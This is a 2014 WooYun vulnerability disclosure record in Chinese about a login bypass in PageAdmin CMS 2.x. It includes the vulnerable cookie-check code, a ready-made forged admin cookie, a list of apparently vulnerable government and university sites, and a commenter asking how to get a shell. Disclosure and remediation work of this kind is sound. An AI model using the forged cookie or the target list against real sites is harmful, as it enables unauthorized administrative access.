{"id": 1985, "wybug_id": "wooyun-2014-061589", "wybug_title": "PageAdmin CMS 2.x后台登陆绕过", "wybug_corp": "PageAdmin", "wybug_author": "cmd", "wybug_date": "2014-05-20 15:01", "wybug_open_date": "2014-08-18 15:02", "wybug_type": "非授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-28：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-18：\t细节向公众公开  简要描述： PageAdmin CMS 2.x后台登陆绕过 详细说明：  后台使用Master_Valicate.Master_Check函数来验证用户是否登陆，下面是此函数代码\nif (HttpContext.Current.Request.Cookies[\"Master\"] != null) {    if (HttpContext.Current.Request.Cookies[\"Master\"].Values[\"LoginProcess\"] != null) {        Md5 md = new Md5();        string string_ = HttpContext.Current.Request.Cookies[\"Master\"].Values[\"UserName\"].ToString();        string str = HttpContext.Current.Request.Cookies[\"Master\"].Values[\"LoginDate\"].ToString();        string b = HttpContext.Current.Request.Cookies[\"Master\"].Values[\"Valicate\"].ToString();        if (!this.method_1(string_) || md.Get_Md5(str) != b) {            HttpContext.Current.Response.Write(\"<script language=javascript>alert('非法登陆!');top.location.href='login.aspx';</script>\");            HttpContext.Current.Response.End();        }    } else {        HttpContext.Current.Response.Write(\"<script language=javascript>alert('未登陆或登陆超时!');top.location.href='login.aspx';</script>\");        HttpContext.Current.Response.End();    }} else {    HttpContext.Current.Response.Write(\"<script language=javascript>alert('未登陆或登陆超时!');top.location.href='login.aspx';</script>\");    HttpContext.Current.Response.End();}\n首先它检测cookie Master是否存在，这里是可以定义Cookie来绕过，继续往下它检测Master[LoginProcess]是否存在，最后再获取Master[UserName],Master[LoginDate],Master[Valicate]的值，然后检测UserName是不是字符串，然后检测Valicate的值是不是等于md.Get_Md5(LoginDate)，如果都OK，就绕过了验证。那么我们就可以设置Cookie，只要让Valicate==md.Get_Md5(LoginDate)就行我们先让LoginDate=1，然后写个aspx文件，计算出md.Get_Md5(\"1\")的值\n\n最后Cookie就是Master=1&LoginProcess=1&UserName=admin&LOginDate=1&Valicate=12b36e45c2df117d12a068814d826283f9c32f845e1589142208628b13f访问下后台，会报错，错误出在PageAdmin.masterhead.Page_Load查看此处代码，发现有这句string text = HttpContext.Current.Request.Cookies[\"Master\"].Values[\"Permissions\"].ToString();所以cookie还要再加上Permissions才行，最后构造出来的Cookie就是Master=1&LoginProcess=1&UserName=admin&LOginDate=1&Valicate=12b36e45c2df117d12a068814d826283f9c32f845e1589142208628b13f&Permissions=1   漏洞证明：  随便找个网站，如http://scxy.shmtu.edu.cn打开网站，然后设置下cookie\n\n直接访问后台/master/index.aspx\n\n找了点有漏洞的http://www.lfzhzf.lfang.gov.cn/master/login.aspxhttp://mc.zgts.gov.cn/master/login.aspxhttp://www.dxfp.gov.cn/master/login.aspxhttp://sjxx.yining.gov.cn/master/login.aspxhttp://daj.jinyun.gov.cn/master/login.aspxhttp://www.jctj.gov.cn:9000/master/login.aspxhttp://zyy.zigui.gov.cn/master/login.aspxhttp://www.ymhmw.gov.cn/master/login.aspxhttp://rsc.ynnu.edu.cn/master/login.aspxhttp://xxb.gdcc.edu.cn/master/login.aspxhttp://iarc.sysu.edu.cn/master/login.aspxhttp://www.zhongdinggroup.com/master/login.aspx   修复方案：  用session   版权声明：转载请注明来源 cmd@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-05-25 14:13 厂商回复： CNVD确认并复现所述情况，将会整理最近所有PageAdmin漏洞，通过公开联系渠道向软件生产厂商通报处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-16 17:45 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  这个的代码好像是改过了。最后登录时间放数据库里面了。哈哈。就是我最近发的那个    \n     2014-08-18 15:38 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  这个有点意思。。。。。    \n     2014-09-26 06:50 |    \t\tgod lucky \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 本人擅长：Au、Ai、Fw、Dw、Fl、Br、Ae、Pr...)\t\t \n  @cmd 问题是绕过后台了 拿不了shell  2.O的功能比较3.0简单 如何拿shell 请详解    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}